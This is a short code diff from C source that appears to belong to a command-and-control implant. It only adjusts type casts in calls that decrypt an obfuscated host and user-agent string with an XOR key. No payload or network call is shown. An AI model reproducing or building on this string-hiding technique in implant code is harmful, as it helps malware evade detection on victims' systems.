@@ -24,8 +24,8 @@ VOID RvntInit() {
     UCHAR d_UserAgent[sizeof(e_UserAgent)] = {0};
     UCHAR d_Host[sizeof(e_Host)] = {0};
 
-    ROL_AND_DECRYPT((PUCHAR)e_UserAgent, sizeof(e_UserAgent), 1, d_UserAgent, (PCCH) s_xk);
-    ROL_AND_DECRYPT((PUCHAR)e_Host, sizeof(e_Host), 1, d_Host, (PCCH) s_xk);
+    ROL_AND_DECRYPT((CONST CHAR*)e_UserAgent, sizeof(e_UserAgent), 1, (CHAR*) d_UserAgent, (PCCH) s_xk);
+    ROL_AND_DECRYPT((CONST CHAR*)e_Host, sizeof(e_Host), 1, (CHAR*) d_Host, (PCCH) s_xk);
 
     PWCHAR w_UserAgent = NULL;
     PWCHAR w_Host = NULL;
